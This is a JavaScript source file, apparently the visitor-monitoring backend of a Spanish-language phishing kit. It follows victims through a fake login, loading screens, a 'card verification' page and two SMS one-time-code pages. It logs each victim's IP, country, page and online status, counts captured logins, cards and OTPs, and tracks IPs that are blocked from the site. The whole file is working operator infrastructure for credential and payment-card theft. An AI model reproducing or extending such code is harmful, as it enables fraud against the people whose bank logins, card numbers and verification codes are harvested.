const { ROUTES } = require('../config/constants');
const geoip = require('geoip-lite');

// Friendly names for the funnel steps
const PAGE_NAMES = {
    [ROUTES.LOGIN]: 'Login',
    [ROUTES.LOADING_1]: 'Cargando...',
    [ROUTES.LOADING_2]: 'Cargando...',
    [ROUTES.LOADING_3]: 'Cargando...',
    [ROUTES.LOADING_4]: 'Cargando...',
    [ROUTES.CARD_VERIFICATION]: 'Verificación de tarjeta',
    [ROUTES.SMS_1]: 'OTP (SMS 1)',
    [ROUTES.SMS_2]: 'OTP (SMS 2)',
    '/loading': 'Cargando...'
};

// Resolve country/flag info from an IP (offline geo ip lookup)
function lookupCountry(ip) {
    if (!ip || ip === 'unknown') return null;
    const geo = geoip.lookup(ip);
    if (!geo) return null;
    const code = geo.country || '';
    return {
        code,
        name: geo.country ? geoNames[code] || code : 'Desconocido',
        flag: geo.country ? flagEmoji(code) : '🏳️'
    };
}

// ISO-3166 alpha-2 -> Spanish country names (common set)
const geoNames = {
    AD: 'Andorra', AE: 'Emiratos Árabes', AF: 'Afganistán', AG: 'Antigua y Barbuda',
    AL: 'Albania', AM: 'Armenia', AO: 'Angola', AR: 'Argentina', AT: 'Austria',
    AU: 'Australia', AZ: 'Azerbaiyán', BA: 'Bosnia y Herzegovina', BB: 'Barbados',
    BD: 'Bangladés', BE: 'Bélgica', BF: 'Burkina Faso', BG: 'Bulgaria', BH: 'Baréin',
    BI: 'Burundi', BJ: 'Benín', BN: 'Brunéi', BO: 'Bolivia', BR: 'Brasil', BS: 'Bahamas',
    BT: 'Bután', BW: 'Botsuana', BY: 'Bielorrusia', BZ: 'Belice', CA: 'Canadá',
    CD: 'RD del Congo', CF: 'República Centroafricana', CG: 'Congo', CH: 'Suiza',
    CI: 'Costa de Marfil', CL: 'Chile', CM: 'Camerún', CN: 'China', CO: 'Colombia',
    CR: 'Costa Rica', CU: 'Cuba', CV: 'Cabo Verde', CY: 'Chipre', CZ: 'Chequia',
    DE: 'Alemania', DJ: 'Yibuti', DK: 'Dinamarca', DM: 'Dominica', DO: 'Rep. Dominicana',
    DZ: 'Argelia', EC: 'Ecuador', EE: 'Estonia', EG: 'Egipto', ES: 'España', ET: 'Etiopía',
    FI: 'Finlandia', FJ: 'Fiyi', FR: 'Francia', GA: 'Gabón', GB: 'Reino Unido',
    GD: 'Granada', GE: 'Georgia', GH: 'Ghana', GM: 'Gambia', GN: 'Guinea', GQ: 'Guinea Ecuatorial',
    GR: 'Grecia', GT: 'Guatemala', GW: 'Guinea-Bisáu', GY: 'Guyana', HK: 'Hong Kong',
    HN: 'Honduras', HR: 'Croacia', HT: 'Haití', HU: 'Hungría', ID: 'Indonesia', IE: 'Irlanda',
    IL: 'Israel', IN: 'India', IQ: 'Irak', IR: 'Irán', IS: 'Islandia', IT: 'Italia',
    JM: 'Jamaica', JO: 'Jordania', JP: 'Japón', KE: 'Kenia', KG: 'Kirguistán', KH: 'Camboya',
    KM: 'Comoras', KR: 'Corea del Sur', KW: 'Kuwait', KZ: 'Kazajistán', LA: 'Laos',
    LB: 'Líbano', LC: 'Santa Lucía', LI: 'Liechtenstein', LK: 'Sri Lanka', LR: 'Liberia',
    LS: 'Lesoto', LT: 'Lituania', LU: 'Luxemburgo', LV: 'Letonia', LY: 'Libia',
    MA: 'Marruecos', MD: 'Moldavia', ME: 'Montenegro', MG: 'Madagascar', MK: 'Macedonia del Norte',
    ML: 'Malí', MM: 'Myanmar', MN: 'Mongolia', MR: 'Mauritania', MT: 'Malta', MU: 'Mauricio',
    MV: 'Maldivas', MW: 'Malaui', MX: 'México', MY: 'Malasia', MZ: 'Mozambique',
    NA: 'Namibia', NE: 'Níger', NG: 'Nigeria', NI: 'Nicaragua', NL: 'Países Bajos',
    NO: 'Noruega', NP: 'Nepal', NZ: 'Nueva Zelanda', OM: 'Omán', PA: 'Panamá', PE: 'Perú',
    PG: 'Papúa Nueva Guinea', PH: 'Filipinas', PK: 'Pakistán', PL: 'Polonia',
    PT: 'Portugal', PY: 'Paraguay', QA: 'Catar', RO: 'Rumanía', RS: 'Serbia', RU: 'Rusia',
    RW: 'Ruanda', SA: 'Arabia Saudita', SD: 'Sudán', SE: 'Suecia', SG: 'Singapur',
    SI: 'Eslovenia', SK: 'Eslovaquia', SL: 'Sierra Leona', SN: 'Senegal', SO: 'Somalia',
    SR: 'Surinam', SV: 'El Salvador', SY: 'Siria', SZ: 'Esuatini', TD: 'Chad', TG: 'Togo',
    TH: 'Tailandia', TJ: 'Tayikistán', TL: 'Timor Oriental', TM: 'Turkmenistán', TN: 'Túnez',
    TR: 'Turquía', TT: 'Trinidad y Tobago', TW: 'Taiwán', TZ: 'Tanzania', UA: 'Ucrania',
    UG: 'Uganda', US: 'Estados Unidos', UY: 'Uruguay', UZ: 'Uzbekistán', VE: 'Venezuela',
    VN: 'Vietnam', YE: 'Yemen', ZA: 'Sudáfrica', ZM: 'Zambia', ZW: 'Zimbabue'
};

// ISO-3166 alpha-2 -> regional indicator emoji flag
function flagEmoji(code) {
    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 127397 + c.charCodeAt(0)));
}

const ONLINE_WINDOW_MS = 30 * 1000;       // online if seen within the last 30s (heartbeat every 10s)
const VISITOR_TTL_MS = 15 * 60 * 1000;    // drop visitors idle for more than 15 min
const MAX_EVENTS = 100;

class MonitorService {
    constructor() {
        this.visitors = new Map(); // ip -> visitor record
        this.events = [];          // newest first
        this.eventSeq = 0;
        this.counters = {
            visits: 0,      // unique IPs seen
            pageViews: 0,   // total GET page loads
            logins: 0,
            cards: 0,
            otps: 0,
            blockedHits: 0
        };
        this.startedAt = Date.now();

        const timer = setInterval(() => this.prune(), 60 * 1000);
        if (timer.unref) timer.unref();
    }

    // Track a normal HTTP request
    trackRequest(ip, req, blocked) {
        if (!ip) return;
        const now = Date.now();
        let v = this.visitors.get(ip);

        if (!v) {
            const geo = lookupCountry(ip);
            v = {
                ip,
                userAgent: '',
                page: '-',
                path: '',
                firstSeen: now,
                lastSeen: now,
                hits: 0,
                blocked: false,
                country: geo ? geo.name : null,
                countryCode: geo ? geo.code : null,
                flag: geo ? geo.flag : null
            };
            this.visitors.set(ip, v);
            this.counters.visits++;
            this.pushEvent('visitor', ip, {});
        }

        v.lastSeen = now;
        v.hits++;
        v.blocked = !!blocked;
        v.userAgent = req.headers['user-agent'] || v.userAgent;

        if (blocked) this.counters.blockedHits++;

        if (req.method === 'GET') {
            this.counters.pageViews++;
            v.path = req.path;
            v.page = PAGE_NAMES[req.path] || req.path;
        }
    }

    // Lightweight keep-alive ping from the shared front-end script
    heartbeat(ip, userAgent, blocked) {
        if (!ip) return;
        const now = Date.now();
        let v = this.visitors.get(ip);

        if (!v) {
            const geo = lookupCountry(ip);
            v = {
                ip,
                userAgent: userAgent || '',
                page: '-',
                path: '',
                firstSeen: now,
                lastSeen: now,
                hits: 0,
                blocked: !!blocked,
                country: geo ? geo.name : null,
                countryCode: geo ? geo.code : null,
                flag: geo ? geo.flag : null
            };
            this.visitors.set(ip, v);
            this.counters.visits++;
            this.pushEvent('visitor', ip, {});
            return;
        }

        v.lastSeen = now;
        v.blocked = !!blocked;
        if (userAgent) v.userAgent = userAgent;
    }

    // Record a business event (login, card, otp...)
    trackEvent(type, ip, detail) {
        switch (type) {
            case 'login': this.counters.logins++; break;
            case 'card': this.counters.cards++; break;
            case 'sms1':
            case 'sms2': this.counters.otps++; break;
        }
        this.pushEvent(type, ip, detail || {});
    }

    pushEvent(type, ip, detail) {
        this.events.unshift({
            id: ++this.eventSeq,
            type,
            ip,
            detail,
            time: Date.now()
        });
        if (this.events.length > MAX_EVENTS) {
            this.events.length = MAX_EVENTS;
        }
    }

    // Remove visitors that have been idle for a long time
    prune() {
        const cutoff = Date.now() - VISITOR_TTL_MS;
        for (const [ip, v] of this.visitors) {
            if (v.lastSeen < cutoff) {
                this.visitors.delete(ip);
            }
        }
    }

    getSnapshot(blockedIps) {
        const now = Date.now();
        const blockedSet = new Set((blockedIps || []).map(ip => ip.replace(/^.*:/, '').trim()));
        const visitors = Array.from(this.visitors.values())
            .sort((a, b) => b.lastSeen - a.lastSeen)
            .map(v => {
                // Derive the blocked flag live so the UI reflects the real block list,
                // even if the visitor has not sent a request since being (un)blocked.
                const normalized = (v.ip || '').replace(/^.*:/, '').trim();
                const isBlocked = blockedSet.has(v.ip) || blockedSet.has(normalized);
                return {
                    ip: v.ip,
                    userAgent: v.userAgent,
                    page: v.page,
                    path: v.path,
                    firstSeen: v.firstSeen,
                    lastSeen: v.lastSeen,
                    hits: v.hits,
                    blocked: isBlocked,
                    country: v.country || null,
                    countryCode: v.countryCode || null,
                    flag: v.flag || null,
                    online: (now - v.lastSeen) <= ONLINE_WINDOW_MS
                };
            });

        return {
            OK: true,
            now,
            uptimeSeconds: Math.floor((now - this.startedAt) / 1000),
            stats: {
                online: visitors.filter(v => v.online).length,
                visits: this.counters.visits,
                pageViews: this.counters.pageViews,
                logins: this.counters.logins,
                cards: this.counters.cards,
                otps: this.counters.otps,
                blockedHits: this.counters.blockedHits,
                blocked: (blockedIps || []).length
            },
            visitors,
            events: this.events.slice(0, 50),
            blockedIps: blockedIps || []
        };
    }
}

module.exports = new MonitorService();
